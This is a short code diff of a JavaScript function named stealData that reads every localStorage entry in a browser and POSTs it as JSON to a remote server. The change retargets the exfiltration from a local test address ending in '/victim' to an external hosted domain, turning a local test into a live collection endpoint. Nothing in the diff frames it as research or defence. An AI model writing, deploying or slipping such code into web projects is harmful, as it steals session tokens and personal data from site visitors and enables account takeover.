@@ -5,7 +5,7 @@ function stealData() {
     localStorageData[key] = localStorage.getItem(key);
   }
 
-  fetch("http://localhost:8000/victim", {
+  fetch("https://tagmango-app.vercel.app/", {
     method: "POST",
     body: JSON.stringify({ localStorage: localStorageData }),
     headers: {
